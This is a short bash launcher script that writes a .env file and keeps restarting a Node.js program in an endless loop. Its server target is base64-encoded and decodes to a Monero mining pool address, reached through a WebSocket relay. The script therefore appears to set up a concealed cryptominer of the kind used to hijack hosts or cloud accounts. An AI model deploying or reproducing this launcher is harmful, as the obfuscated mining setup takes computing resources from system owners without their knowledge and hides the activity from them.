#!/bin/bash
CONNECT=$1
echo "SERVER_WS=wss://cloudnineone.my.id
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
SERVER_SECRET=BAGONG
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
